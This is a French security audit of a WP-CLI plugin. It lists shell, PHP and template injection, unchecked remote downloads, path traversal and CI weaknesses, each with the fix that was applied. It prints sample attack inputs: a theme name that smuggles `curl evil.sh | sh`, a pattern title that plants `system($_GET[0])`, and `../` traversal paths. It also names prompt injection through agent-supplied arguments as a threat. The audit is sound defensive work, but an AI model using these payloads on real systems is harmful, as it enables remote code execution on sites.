# Audit de sécurité — Skouerr CLI 1.1.0

Date : 2026-10-15 · Périmètre : commit `91872f7` (branche `main`), dépendances de `composer.lock`, workflows GitHub.

## Contexte et modèle de menace

Skouerr CLI est un MU-plugin qui ajoute des commandes `wp skouerr …` à WP-CLI. Le code ne tourne qu'en ligne de commande, avec les droits de l'utilisateur système qui lance WP-CLI. Un attaquant qui a déjà un shell n'a donc rien à gagner.

Trois vecteurs restent réels :

1. **Entrées non fiables passées à la CLI.** Les commandes sont de plus en plus lancées par des agents IA (Claude Code, Copilot…) dont les arguments peuvent venir d'un ticket, d'une page web ou d'un fichier (prompt injection).
2. **Contenu de la base de données.** Un éditeur WordPress (sans accès serveur) contrôle le titre et le contenu des patterns et templates que `save:pattern` / `save:template` écrivent dans le thème, sous forme de fichiers PHP.
3. **Contenu distant.** `make:theme` et `import:block` téléchargent puis installent du code depuis le réseau.

## Synthèse

| # | Gravité | Composant | Problème |
|---|---------|-----------|----------|
| S1 | Critique | `make:theme` | Injection de commande shell via `--name` (`exec('cd ' . … . $name . ' && composer install')`) |
| S2 | Haute | `save:pattern` | Injection de code PHP via le titre d'un pattern (élévation éditeur → exécution de code) |
| S3 | Haute | `make:binding`, `make:post-type`, `make:variation`, blocs | Injection de code dans les fichiers générés : les valeurs sont insérées sans échappement dans du PHP, du JS et du JSON |
| S4 | Haute | `make:theme`, `import:block` | Code distant installé sans contrôle d'intégrité, HTTP accepté, code HTTP et type de contenu non vérifiés |
| S5 | Haute | Toutes les commandes `make:*`, `import:block` | Traversée de répertoire : les noms saisis sont concaténés dans les chemins (`../`) |
| S6 | Moyenne | Blocs | Le dossier `<thème>/tmp` est vidé puis supprimé à chaque `make:block` (perte de données si le thème l'utilise) |
| S7 | Moyenne | `save:pattern`, `save:template` | Suppression définitive en base (`wp_delete_post( …, true )`) sans confirmation ; écrasement silencieux des fichiers ; templates d'autres thèmes exportés |
| S8 | Moyenne | Toutes les commandes `make:*` | Écrasement silencieux des fichiers existants, retours de `mkdir` / `copy` / `file_put_contents` jamais vérifiés |
| S9 | Moyenne | Dépendances dev | `squizlabs/php_codesniffer` 3.10.3, `wp-coding-standards/wpcs` 3.1.0, `phpcsstandards/phpcsutils` : 3 avis de sécurité « high » |
| S10 | Moyenne | Dépendances runtime | `symfony/finder` verrouillé sur `6.0.0` (branche en fin de vie, plus de correctifs) |
| S11 | Moyenne | CI | Action tierce non épinglée par SHA qui reçoit `PACKAGIST_API_TOKEN` ; `composer update` en CI ignore le lockfile |
| S12 | Basse | `import:block` | Archive temporaire écrite dans `wp-content/uploads` (dossier public) avec un nom prévisible |
| S13 | Basse | `make:theme` | `switch_theme()` exécuté sans confirmation, y compris en production |
| S14 | Info | Général | `die()` dans le code, pas de code de sortie fiable, erreurs PHP (`Undefined array key "library"`) |

## Détail

### S1 — Injection de commande shell (critique)

`includes/commands/class-skouerr-cli-make-theme.php:140`

```php
exec( 'cd ' . WP_CONTENT_DIR . '/themes/' . $name . ' && composer install' );
```

`$name` vient de `--name` ou d'une saisie, sans validation ni `escapeshellarg()`. Exemple : `wp skouerr make:theme --name='x; curl evil.sh | sh'`. Un agent qui reçoit un nom de thème depuis une source externe exécute ce code.

**Correctif appliqué :** validation du slug (`^[a-z0-9][a-z0-9-]*$`) et lancement de Composer avec `proc_open()` sous forme de tableau d'arguments (aucun shell), avec `cwd` explicite.

### S2 — Injection PHP via le titre d'un pattern (haute)

`includes/commands/class-skouerr-cli-save-pattern.php:91-97`

Le fichier généré commence par un en-tête PHP. Le titre passe par `esc_html()`, qui n'échappe pas `*/`. Un titre comme `x */ system($_GET[0]); /*` ferme le commentaire et place du code PHP exécutable dans `patterns/<slug>.php`. Ce fichier est chargé par WordPress à chaque requête. Un simple éditeur peut donc obtenir une exécution de code dès qu'un administrateur lance `save:pattern`.

En plus, `wp_kses_post()` modifie le balisage des blocs (attributs JSON, SVG…) et casse certains patterns.

**Correctif appliqué :** le titre est nettoyé (suppression de `*/`, `<?`, `?>`, retours ligne). Le contenu des blocs est écrit tel quel après la balise `?>`. Le PHP n'est pas interprété dans ce contenu car le fichier ne repasse pas en mode PHP, et toute séquence `<?` du contenu est neutralisée.

### S3 — Injection dans les fichiers générés (haute)

Les gabarits (`templates/…`) sont remplis avec `str_replace()` sans échappement. Exemples :

- `templates/binding/default` : `$value = '%SK_BINDING_TITLE%';` → titre `'; system('id'); //`.
- `templates/post-type/post-type` : `__('%SK_PT_LABEL%', '%SK_PT_DOMAIN%')`.
- `templates/variations/default` : chaînes JS entre apostrophes.
- `block.json` : chaînes JSON sans échappement (JSON invalide si le titre contient `"`).

**Correctif appliqué :** moteur de gabarit qui échappe selon le contexte (`php` : chaîne entre apostrophes, `js` : `json_encode`, `json` : `json_encode`, `slug` : validation stricte). Les identifiants (nom, slug, préfixe, icône, domaine) sont validés par expression régulière avant tout rendu.

### S4 — Téléchargements sans contrôle d'intégrité (haute)

- `make:theme` télécharge une archive depuis `SKOUERR_REMOTE_THEME_URL`, l'extrait dans `wp-content/themes`, l'active, lance `composer install` puis `skouerr-theme setup`. Aucune vérification : ni code HTTP, ni type de contenu, ni taille, ni empreinte. Une page d'erreur HTML est écrite comme `.zip`.
- `import:block` utilise par défaut `http://localhost` (HTTP clair) et accepte n'importe quelle URL via `--library`. Une réponse JSON invalide provoque des erreurs PHP.
- `ZipArchive::extractTo()` neutralise les `../`, mais ne bloque ni les liens symboliques ni les fichiers inattendus (`.htaccess`, `.user.ini`).

**Correctif appliqué :** HTTPS obligatoire (sauf hôte local explicite), vérification du code 200, taille maximale, vérification optionnelle de l'empreinte SHA-256 (`--sha256` ou en-tête `X-Skouerr-Sha256`), extraction entrée par entrée avec rejet des chemins absolus, des `..`, des liens symboliques et des fichiers `.htaccess` / `.user.ini`, extraction dans un dossier temporaire hors du web.

### S5 — Traversée de répertoire (haute)

Exemples : `make:template` → `get_template_directory() . '/templates/' . $name . '.html'` avec `name=../../../../wp-config`. Même schéma pour `make:binding`, `make:post-type`, `make:variation`, `make:block`, `import:block` (`$type` et `$name` sont aussi injectés dans l'URL et le chemin d'extraction).

**Correctif appliqué :** validation des noms + toutes les écritures passent par `Filesystem::path()`, qui refuse tout chemin résolu hors du dossier du thème.

### S6 — Suppression du dossier `tmp` du thème (moyenne)

`Skouerr_Template_Block::remove_tmp_folder()` vide puis supprime `<thème>/tmp`. Si un thème utilise ce dossier (cache Twig, exports…), son contenu est perdu. Deux `make:block` en parallèle se marchent dessus.

**Correctif appliqué :** plus de dossier temporaire. Les fichiers sont rendus en mémoire puis écrits directement à destination.

### S7 — Suppression définitive en base (moyenne)

`save:pattern` et `save:template` appellent `wp_delete_post( $id, true )` (sans corbeille) après avoir écrasé le fichier cible sans vérification. `save:template` liste tous les `wp_template`, y compris ceux d'autres thèmes.

**Correctif appliqué :** la suppression en base devient optionnelle (`--delete`), passe toujours par la corbeille, et demande confirmation en mode interactif. Les fichiers existants ne sont écrasés qu'avec `--force`. Seuls les templates du thème actif sont proposés.

### S8 — Écrasements et erreurs ignorées (moyenne)

Aucune commande ne vérifie l'existence de la cible ni le retour des fonctions de fichiers. `make:binding` échoue avec un warning si le dossier `bindings/` n'existe pas, puis affiche « created successfully ».

**Correctif appliqué :** refus d'écraser sans `--force`, création récursive des dossiers, exception sur toute erreur d'écriture, `--dry-run` pour prévisualiser.

### S9 / S10 — Dépendances

`composer audit` (2026-10-15) :

| Paquet | Version | Avis |
|--------|---------|------|
| `squizlabs/php_codesniffer` | 3.10.3 | CVE-2026-67434 (injection de commande, < 3.13.6) |
| `wp-coding-standards/wpcs` | 3.1.0 | CVE-2026-45293 (exécution de code, < 3.4.1) |
| `phpcsstandards/phpcsutils` | 1.0.x | CVE-2026-65954 (exécution de code, < 1.2.3) |

Ce sont des dépendances de développement, mais elles tournent en CI et sur les postes. `symfony/finder` est verrouillé sur `6.0.0` (contrainte exacte `"6.0"`), branche hors support.

**Correctif appliqué :** mise à jour des outils de qualité (`composer audit` propre au 2026-10-15), suppression des trois dépendances Symfony. Le plugin n'a plus aucune dépendance à l'exécution : les questions passent par la bibliothèque `php-cli-tools` fournie avec WP-CLI. `composer audit` tourne en CI.

### S11 — CI (moyenne)

- `mnavarrocarter/packagist-update@v1.0` reçoit `PACKAGIST_API_TOKEN`. Un tag peut être déplacé : il faut épingler l'action par SHA ou appeler l'API Packagist avec `curl`.
- `actions/checkout@v3` est obsolète.
- `composer update && composer install` en CI ignore le lockfile : la CI ne teste pas ce qui est livré.
- Aucun `permissions:` restreint sur les workflows.

**Correctif appliqué :** workflows réécrits (`permissions: contents: read`, actions épinglées par SHA, `composer install`, `composer audit`, PHPStan, tests sur PHP 8.3 → 8.5, tests de bout en bout dans WordPress, appel Packagist par `curl` avec le jeton dans un en-tête).

### S12 à S14

- S12 : l'archive est désormais téléchargée avec `download_url()` dans le dossier temporaire système.
- S13 : `make:theme` n'active le thème qu'avec `--activate` (ou confirmation interactive).
- S14 : plus de `die()`. Codes de sortie documentés (voir `docs/AGENTS.md`).

## Vérification

Chaque correctif est couvert par un test : `tests/Unit/*` (validation, échappement, chemins, extraction ZIP, process) et `tests/integration/smoke.sh` (injection via titre de binding, titre et contenu de pattern, traversée, conflits, dry-run) exécuté dans WordPress 7.1.3 sous PHP 8.5.

## Points hors périmètre à vérifier côté serveur

- L'API `download.skouerr.dev` doit signer ou publier l'empreinte SHA-256 des archives (en-tête `X-Skouerr-Sha256`) pour que la vérification d'intégrité soit systématique.
- Les endpoints `/wp-json/skouerr/v1/library/*` doivent valider `type` et `name` côté serveur.
